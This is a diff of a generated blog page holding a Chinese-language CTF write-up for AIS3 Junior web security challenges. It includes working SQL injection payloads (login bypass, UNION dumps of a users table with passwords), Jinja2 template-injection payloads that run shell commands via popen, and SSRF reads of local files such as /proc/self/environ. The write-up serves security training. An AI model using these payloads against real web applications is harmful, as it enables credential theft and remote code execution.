-<h2 id="06-SQL-Injection"><a href="#06-SQL-Injection" class="headerlink" title="06 - SQL Injection"></a>06 - SQL Injection</h2><h3 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h3><p>用最簡單的SQL語法就可以拿到flag<br><del>好像簡單的CTF第一題SQL都可以用<code>admin&#39;--</code></del><br>帳號<code>admin&#39;--</code> 密碼隨便填<br><img src="https://hackmd.io/_uploads/B1FZku3cR.png" alt="image"></p>
+<h2 id="06-sql-injection"><a class="markdownIt-Anchor" href="#06-sql-injection"></a> 06 - SQL Injection</h2>
+<h3 id="sql1"><a class="markdownIt-Anchor" href="#sql1"></a> SQL1</h3>
+<p>用最簡單的SQL語法就可以拿到flag<br />
+<s>好像簡單的CTF第一題SQL都可以用<code>admin'--</code></s><br />
+帳號<code>admin'--</code> 密碼隨便填<br />
+<img src="https://hackmd.io/_uploads/B1FZku3cR.png" alt="image" /></p>
 <blockquote>
-<p>AIS3_Junior{SQL’InjectionXDorD&#x3D;D_–_-}</p>
+<p>AIS3_Junior{SQL’InjectionXDorD=D_–_-}</p>
 </blockquote>
-<h3 id="SQL2"><a href="#SQL2" class="headerlink" title="SQL2"></a>SQL2</h3><p>參考網站: <a target="_blank" rel="noopener" href="https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/">https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/</a><br>先用<code>pp&#39;UNION SELECT NULL#</code>去嘗試讓兩個表中有相同的columns<br><img src="https://hackmd.io/_uploads/BJZSV-a9A.png" alt="image"></p>
+<h3 id="sql2"><a class="markdownIt-Anchor" href="#sql2"></a> SQL2</h3>
+<p>參考網站: <a target="_blank" rel="noopener" href="https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/">https://little-c-blog.coderbridge.io/2023/09/04/SQLi-lab-1/</a><br />
+先用<code>pp'UNION SELECT NULL#</code>去嘗試讓兩個表中有相同的columns<br />
+<img src="https://hackmd.io/_uploads/BJZSV-a9A.png" alt="image" /></p>
 <ul>
-<li>直到<code>pp&#39; UNION SELECT NULL, NULL,NULL,NULL#</code></li>
+<li>直到<code>pp' UNION SELECT NULL, NULL,NULL,NULL#</code></li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/BkJj4Zp9A.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkJj4Zp9A.png" alt="image" /></p>
 <p>*列出所有table</p>
 <ol>
 <li>mysql</li>
@@ -497,96 +570,122 @@
 <li>ApexPredators</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(schema_name),group_concat(schema_name),group_concat(schema_name),group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/HJzhUW69A.png" alt="image"><br><img src="https://hackmd.io/_uploads/S1fMGYa5C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJzhUW69A.png" alt="image" /><br />
+<img src="https://hackmd.io/_uploads/S1fMGYa5C.png" alt="image" /></p>
 <ul>
 <li>發現網頁左上角剛好是第六個table的名稱 猜測可能是要到<code>ApexPredators</code></li>
 <li>試試看將我們所要的table:<code>ApexPredators</code>抓出來</li>
 <li>接著繼續往下找ApexPredators的東西</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(table_name),group_concat(table_name),group_concat(table_name),group_concat(table_name) from information_schema.tables where table_schema=&#x27;ApexPredators&#x27; #</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BkoQ_-p5C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkoQ_-p5C.png" alt="image" /></p>
 <ul>
 <li>發現有users</li>
 <li>繼續往下找users的東西</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp&#x27; UNION SELECT group_concat(column_name),group_concat(column_name),group_concat(column_name),group_concat(column_name) from information_schema.columns where table_schema=&#x27;ApexPredators&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/r1MidbaqC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1MidbaqC.png" alt="image" /></p>
 <ul>
 <li>發現users底下有 id,isAdmin,password,username</li>
 <li>印出id,isAdmin,password,username裡面的內容</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pp&#x27; UNION SELECT id,username,password,isAdmin from ApexPredators.users#</span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/rkuIFZpc0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkuIFZpc0.png" alt="image" /></p>
 <ul>
-<li>發現只有<code>KubenBlisk</code>下面的值是1 <del>大膽假設是admin</del><br>帳號:KubenBlisk 密碼:BliskLeader#2024<br>登入後就得到flag<br><img src="https://hackmd.io/_uploads/rJFf5ba9A.png" alt="image"></li>
+<li>發現只有<code>KubenBlisk</code>下面的值是1 <s>大膽假設是admin</s><br />
+帳號:KubenBlisk 密碼:BliskLeader#2024<br />
+登入後就得到flag<br />
+<img src="https://hackmd.io/_uploads/rJFf5ba9A.png" alt="image" /></li>
 </ul>
-<h2 id="07-Server-Side-Template-Injection"><a href="#07-Server-Side-Template-Injection" class="headerlink" title="07 - Server-Side Template Injection"></a>07 - Server-Side Template Injection</h2><h3 id="STI01"><a href="#STI01" class="headerlink" title="STI01"></a>STI01</h3><p>參考資料:</p>
+<h2 id="07-server-side-template-injection"><a class="markdownIt-Anchor" href="#07-server-side-template-injection"></a> 07 - Server-Side Template Injection</h2>
+<h3 id="sti01"><a class="markdownIt-Anchor" href="#sti01"></a> STI01</h3>
+<p>參考資料:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://blog.1997sty.com/archives/5570">https://blog.1997sty.com/archives/5570</a></li>
 <li><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/S1h1AZ6qA.png" alt="image"><br>裡面有:<code>.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;dir&#39;).read()</code></p>
+<p><img src="https://hackmd.io/_uploads/S1h1AZ6qA.png" alt="image" /><br />
+裡面有:<code>.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()</code></p>
 <ul>
-<li><p>__class__抓到底下的str</p>
+<li>
+<p>__class__抓到底下的str</p>
 </li>
-<li><p>__base__抓到str上層的object</p>
+<li>
+<p>__base__抓到str上層的object</p>
 </li>
-<li><p><strong>subclasses</strong>() Object底下所有的東西，包含函式等[138]應該是popen object</p>
+<li>
+<p><strong>subclasses</strong>() Object底下所有的東西，包含函式等[138]應該是popen object</p>
 </li>
-<li><p><strong>init</strong> 初始化 object</p>
+<li>
+<p><strong>init</strong> 初始化 object</p>
 </li>
-<li><p><strong>globals</strong>[‘popen’] 初始化object下的popen<br>(‘cat FLAG’).read() popen執行cat FLAG並讀出來</p>
+<li>
+<p><strong>globals</strong>[‘popen’] 初始化object下的popen<br />
+(‘cat FLAG’).read() popen執行cat FLAG並讀出來</p>
 </li>
-<li><p>將payload改為:</p>
+<li>
+<p>將payload改為:</p>
 </li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat FLAG&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>即可拿到flag<br><img src="https://hackmd.io/_uploads/r1PdRZacR.png" alt="image"></p>
+<p>即可拿到flag<br />
+<img src="https://hackmd.io/_uploads/r1PdRZacR.png" alt="image" /></p>
 <blockquote>
-<p>AIS3_Junior{.<strong>JinjaTWOOOO.</strong>_[“SSTI”]<strong>.succ3ssXDD.</strong>}</p>
+<p>AIS3_Junior{.<strong>JinjaTWOOOO.</strong><em>[“SSTI”]</em><em>.succ3ssXDD.</em>_}</p>
 </blockquote>
-<h3 id="STI02"><a href="#STI02" class="headerlink" title="STI02"></a>STI02</h3><p>參考資料: </p>
+<h3 id="sti02"><a class="markdownIt-Anchor" href="#sti02"></a> STI02</h3>
+<p>參考資料:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#without-several-chars</a></li>
 <li><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10244403">https://ithelp.ithome.com.tw/articles/10244403</a></li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/HJBl8z6q0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJBl8z6q0.png" alt="image" /></p>
 <p>從全域物件中獲取任何函數，可存取<code>__globals__.__builtins__</code>，實現RCE</p>
 <p>payload:<code>&#123;&#123;request.application.__globals__.__builtins__.__import__('os').popen('cat FLAG').read()&#125;&#125;</code></p>
-<p><img src="https://hackmd.io/_uploads/SkjO8zTqC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SkjO8zTqC.png" alt="image" /></p>
 <blockquote>
 <p>AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</p>
 </blockquote>
-<h2 id="08-Server-Side-Request-Forgery"><a href="#08-Server-Side-Request-Forgery" class="headerlink" title="08 - Server-Side Request Forgery"></a>08 - Server-Side Request Forgery</h2><h3 id="SRF01"><a href="#SRF01" class="headerlink" title="SRF01"></a>SRF01</h3><ul>
+<h2 id="08-server-side-request-forgery"><a class="markdownIt-Anchor" href="#08-server-side-request-forgery"></a> 08 - Server-Side Request Forgery</h2>
+<h3 id="srf01"><a class="markdownIt-Anchor" href="#srf01"></a> SRF01</h3>
+<ul>
 <li>題目有提示 <code>Flag Location : /app/FLAG</code></li>
 <li>發現可以用<code>file:// 表示這是一個本地文件的路徑</code>來去看題目給的路徑</li>
 <li>於是我們直接在網站payload -&gt;<code>file:///app/FLAG</code></li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/Sy_n9dh90.png" alt="image"></p>
-<p>點擊右邊的圖片的原始碼<br><img src="https://hackmd.io/_uploads/B1Slsu3qC.png" alt="image"><br>可以發現有一個被base64加密的東西<br><code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br>線上解密之後拿到flag<br><img src="https://hackmd.io/_uploads/ryqLju2qC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Sy_n9dh90.png" alt="image" /></p>
+<p>點擊右邊的圖片的原始碼<br />
+<img src="https://hackmd.io/_uploads/B1Slsu3qC.png" alt="image" /><br />
+可以發現有一個被base64加密的東西<br />
+<code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br />
+線上解密之後拿到flag<br />
+<img src="https://hackmd.io/_uploads/ryqLju2qC.png" alt="image" /></p>
 <blockquote>
-<p>AIS3_Junior{file:&#x2F;&#x2F;SSRF___XDDD}</p>
+<p>AIS3_Junior{file://SSRF___XDDD}</p>
 </blockquote>
-<h3 id="SRF02"><a href="#SRF02" class="headerlink" title="SRF02"></a>SRF02</h3><p>參考資料 <a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><img src="https://hackmd.io/_uploads/By27jWaqA.png" alt="image"></p>
+<h3 id="srf02"><a class="markdownIt-Anchor" href="#srf02"></a> SRF02</h3>
+<p>參考資料 <a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br />
+<img src="https://hackmd.io/_uploads/By27jWaqA.png" alt="image" /></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ #可查看當下進程的環境變量</span><br></pre></td></tr></table></figure>
 <ul>
 <li>跟上題一樣用<code>file://</code></li>
-<li>payload&#x3D;<code>file:///proc/self/environ</code></li>
+<li>payload=<code>file:///proc/self/environ</code></li>
 </ul>
-<p><img src="https://hackmd.io/_uploads/Byg3s-65C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Byg3s-65C.png" alt="image" /></p>
 <ul>
-<li>查看圖片原始檔<br><img src="https://hackmd.io/_uploads/Sk_khba5R.png" alt="image"></li>
+<li>查看圖片原始檔<br />
+<img src="https://hackmd.io/_uploads/Sk_khba5R.png" alt="image" /></li>
 </ul>
 <p>發現有base64加密的內容</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SE9TVE5BTUU9MTIzMWRlMGVjMjZlAFBZVEhPTl9QSVBfVkVSU0lPTj0yMy4wLjEASE9NRT0vcm9vdABQWVRIT05VTkJVRkZFUkVEPTEAR1BHX0tFWT1BMDM1QzhDMTkyMTlCQTgyMUVDRUE4NkI2NEU2MjhGOEQ2ODQ2OTZEAFVXU0dJX0lOST0vYXBwL3V3c2dpLmluaQBOR0lOWF9NQVhfVVBMT0FEPTAAVVdTR0lfUFJPQ0VTU0VTPTE2AFBZVEhPTkRPTlRXUklURUJZVEVDT0RFPTEAU1RBVElDX1VSTD0vc3RhdGljAFBZVEhPTl9HRVRfUElQX1VSTD1odHRwczovL2dpdGh1Yi5jb20vcHlwYS9nZXQtcGlwL3Jhdy82NmQ4YTBmNjM3MDgzZTJjM2RkZmZjMGNiMWU2NWNlMTI2YWZiODU2L3B1YmxpYy9nZXQtcGlwLnB5AFVXU0dJX0NIRUFQRVI9MgBQQVRIPS91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2xvY2FsL2JpbjovdXNyL3NiaW46L3Vzci9iaW46L3NiaW46L2JpbgBMQU5HPUMuVVRGLTgAUFlUSE9OX1ZFUlNJT049My4xMC4xNABQWVRIT05fU0VUVVBUT09MU19WRVJTSU9OPTY1LjUuMQBOR0lOWF9XT1JLRVJfUFJPQ0VTU0VTPTEATElTVEVOX1BPUlQ9ODAAU1RBVElDX0lOREVYPTAAUFdEPS9hcHAAUFlUSE9OX0dFVF9QSVBfU0hBMjU2PTZmYjdiNzgxMjA2MzU2ZjQ1YWQ3OWVmYmIxOTMyMmNhYTZjMmE1YWQzOTA5MmQwZDQ0ZDBmZWM5NDExN2UxMTgAU1RBVElDX1BBVEg9L2FwcC9zdGF0aWMAUFlUSE9OUEFUSD0vYXBwAEZMQUc9QUlTM19KdW5pb3J7aHR0cDovL0JST0FjY2Vzc0xPQ0FMfQA=</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>放到線上平台解密</li>
-<li>得到flag<br><img src="https://hackmd.io/_uploads/ByRI2-pcA.png" alt="image"><blockquote>
-<p>AIS3_Junior{<a target="_blank" rel="noopener" href="http://broaccesslocal}/">http://BROAccessLOCAL}</a></p>
-</blockquote>
-</li>
+<li>得到flag<br />
+<img src="https://hackmd.io/_uploads/ByRI2-pcA.png" alt="image" /></li>
 </ul>
+<blockquote>
+<p>AIS3_Junior{<a target="_blank" rel="noopener" href="http://BROAccessLOCAL">http://BROAccessLOCAL</a>}</p>
+</blockquote>
 
       
     </div>
@@ -728,10 +827,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        19.9k
+        20.1k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        01:06
+        01:07
       </div>
     
     
@@ -764,7 +863,7 @@
   <h3 class="toc-title">文章目錄</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AIS3-junior-DAY2-%E4%B8%8A%E5%8D%88-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">AIS3 junior DAY2 上午 網頁安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-Broken-Access-Control"><span class="toc-text">01 - Broken Access Control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC01"><span class="toc-text">BAC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC02"><span class="toc-text">BAC02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BAC03"><span class="toc-text">BAC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-File-Upload"><span class="toc-text">02 - File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FIL01"><span class="toc-text">FIL01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FIL02"><span class="toc-text">FIL02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-Local-File-Inclusion"><span class="toc-text">03 - Local File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI01"><span class="toc-text">LFI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LFI02"><span class="toc-text">LFI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-Command-Injection"><span class="toc-text">05 - Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD01"><span class="toc-text">CMD01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD02"><span class="toc-text">CMD02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD03"><span class="toc-text">CMD03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bonus-CMD06"><span class="toc-text">[Bonus] CMD06</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-SQL-Injection"><span class="toc-text">06 - SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL1"><span class="toc-text">SQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL2"><span class="toc-text">SQL2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-Server-Side-Template-Injection"><span class="toc-text">07 - Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#STI01"><span class="toc-text">STI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STI02"><span class="toc-text">STI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-Server-Side-Request-Forgery"><span class="toc-text">08 - Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SRF01"><span class="toc-text">SRF01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SRF02"><span class="toc-text">SRF02</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-junior-day2-%E4%B8%8A%E5%8D%88-%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text"> AIS3 junior DAY2 上午 網頁安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-broken-access-control"><span class="toc-text"> 01 - Broken Access Control</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bac01"><span class="toc-text"> BAC01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bac02"><span class="toc-text"> BAC02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bac03"><span class="toc-text"> BAC03</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-file-upload"><span class="toc-text"> 02 - File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fil01"><span class="toc-text"> FIL01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fil02"><span class="toc-text"> FIL02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-local-file-inclusion"><span class="toc-text"> 03 - Local File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lfi01"><span class="toc-text"> LFI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lfi02"><span class="toc-text"> LFI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-command-injection"><span class="toc-text"> 05 - Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd01"><span class="toc-text"> CMD01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd02"><span class="toc-text"> CMD02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cmd03"><span class="toc-text"> CMD03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bonus-cmd06"><span class="toc-text"> [Bonus] CMD06</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-sql-injection"><span class="toc-text"> 06 - SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql1"><span class="toc-text"> SQL1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql2"><span class="toc-text"> SQL2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-server-side-template-injection"><span class="toc-text"> 07 - Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sti01"><span class="toc-text"> STI01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sti02"><span class="toc-text"> STI02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-server-side-request-forgery"><span class="toc-text"> 08 - Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#srf01"><span class="toc-text"> SRF01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#srf02"><span class="toc-text"> SRF02</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -777,15 +876,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">31</div>
+    <div class="sidebar-state-number">33</div>
   </div>
   <div class="sidebar-state-category">
     <div>分類</div>
-    <div class="sidebar-state-number">6</div>
+    <div class="sidebar-state-number">7</div>
   </div>
   <div class="sidebar-state-tag">
     <div>標籤</div>
-    <div class="sidebar-state-number">8</div>
+    <div class="sidebar-state-number">10</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -1092,7 +1191,7 @@
           url: "http://example.com/2024/10/07/AIS3%20junior/AIS3%20junior%20DAY2%20%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%20writeup/",
           excerpt: "",
           description: "",
-          stripContent: "AIS3 junior DAY2 上午 網頁安全[TOC] 01 - Broken Access ControlBAC01隨便打一個名子login查看url http://ctfd-ais3.crazyfirelee.tw:9001/user將user改成admin  AIS3_Junior{FirstBROKENAccessControl;}  BAC02到Product List裡面觀察每個 View Details的 url 發現後面都有編號且唯獨少了4將4打上去url試試看 http:/",
+          stripContent: " AIS3 junior DAY2 上午 網頁安全 [TOC]  01 - Broken Access Control  BAC01 隨便打一個名子login 查看url http://ctfd-ais3.crazyfirelee.tw:9001/user 將user改成admin   AIS3_Junior{FirstBROKENAccessControl;}   BAC02 到Product List裡面觀察每個 View Details的 url 發現後面都有編號且唯獨少了4 將4打上去u",
           date: "Mon Oct 07 2024 01:15:33 GMT+0800",
           updated: "Thu Apr 24 2025 23:46:46 GMT+0800",
           cover: "/images/banner.jpg",
